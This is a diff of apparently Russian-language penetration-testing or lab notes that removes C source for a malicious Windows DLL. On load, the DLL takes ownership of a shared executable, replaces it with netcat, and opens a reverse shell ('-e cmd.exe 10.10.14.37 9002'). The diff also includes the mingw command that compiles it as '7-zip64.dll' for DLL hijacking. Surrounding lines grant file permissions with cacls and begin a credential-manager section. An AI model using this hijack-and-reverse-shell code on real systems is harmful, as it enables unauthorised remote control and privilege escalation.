@@ -6,39 +6,6 @@
 # Добавить права
     cacls nc64.exe /E /G ginawild:F
 
-
-# Простая DLL на С
-
-#include <windows.h>
-
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
-
-{
-  switch (dwReason)
-{
-case DLL_PROCESS_ATTACH:
-        system("cmd.exe /c whoami /all > c:\\users\\public\\pleasesub.txt");
-
-        system("cmd.exe /c takeown /F c:\\share\\bginfo64.exe");
-        system("cmd.exe /c cacls c:\\share\\bginfo64.exe  /E /G ginawild:F");
-        system("cmd.exe /c icacls c:\\share\\bginfo64.exe >> c:\\users\\public\\pleasesub.txt");
-
-        system ("cmd.exe /c copy c:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe c:\\share\\bginfo64.exe");
-
-        system ("cmd.exe /c copy c:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe c:\\share\\nc64.exe");
-
-        system("cmd.exe /c c:\\share\\bginfo64.exe -e cmd.exe 10.10.14.37 9002");
-        system("cmd.exe /c ping 10.10.14.37");
-
-        break;
-}
-return TRUE;
-}
-
-
-x86_64-w64-mingw32-gcc-win32 script.c -o 7-zip64.dll -shared
-
-
 # Credential Manager
 
     # web credentials
